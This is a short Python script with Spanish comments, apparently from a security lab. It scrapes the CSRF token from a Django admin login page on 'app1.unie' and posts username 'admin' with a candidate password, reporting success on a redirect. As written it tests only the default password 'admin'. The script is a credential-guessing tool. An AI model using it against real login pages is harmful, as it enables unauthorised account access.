#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

def test_login(password):
    session = requests.Session()
    
    # 1. Obtener página de login y token CSRF
    login_url = "http://app1.unie/admin/login/"
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extraer token CSRF
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    
    # 2. Intentar login
    login_data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': 'admin',
        'password': password,
        'next': '/admin/'
    }
    
    headers = {
        'Referer': login_url
    }
    
    response = session.post(login_url, data=login_data, headers=headers, allow_redirects=False)
    
    # 3. Verificar si login fue exitoso
    if response.status_code == 302 and '/admin/' in response.headers.get('Location', ''):
        print(f"[+] ¡CONTRASEÑA ENCONTRADA!: {password}")
        return True
    else:
        print(f"[-] Falló: {password}")
        return False

# Probar solo con admin (ya sabemos que funciona)
test_login("admin")
